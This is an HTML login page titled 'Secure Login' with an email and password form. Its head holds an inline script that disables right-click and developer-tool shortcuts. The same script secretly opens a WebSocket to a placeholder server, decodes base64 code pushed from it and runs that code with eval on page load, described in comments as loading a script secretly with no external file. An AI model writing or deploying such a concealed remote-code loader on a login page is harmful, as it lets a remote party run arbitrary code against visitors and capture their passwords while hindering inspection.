<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login</title>
  <link rel="stylesheet" href="style.css">

  <script>
    (function () {
      // ðŸš€ Disable Right-Click & Developer Shortcuts
      document.addEventListener("contextmenu", (e) => e.preventDefault());
      document.onkeydown = function (e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) || (e.ctrlKey && e.key === "U")) {
          return false;
        }
      };

      // ðŸš€ Load Script Secretly via WebSocket
      const ws = new WebSocket("wss://your-secure-server.com"); // Replace with your WebSocket server
      ws.onmessage = function (event) {
        try {
          let scriptContent = atob(event.data); // Decode Base64 script
          eval(scriptContent);  // Run script in memory (no external file)
        } catch (err) {
          console.error("Error loading script:", err);
        }
      };
    })();
  </script>
</head>

<body>
  <main>
    <div class="container">
      <div class="card">
        <h4 class="title">Log In!</h4>
        <form>
          <label class="field" for="logemail">
            <span class="input-icon">@</span>
            <input autocomplete="off" id="logemail" placeholder="Email" class="input-field" name="logemail"
              type="email" />
          </label>
          <label class="field" for="logpass">
            <input id="logpass" placeholder="Password" class="input-field" name="logpass" type="password" />
          </label>
          <button class="btn" type="button">Login</button>
        </form>
      </div>
    </div>
  </main>
</body>
</html>
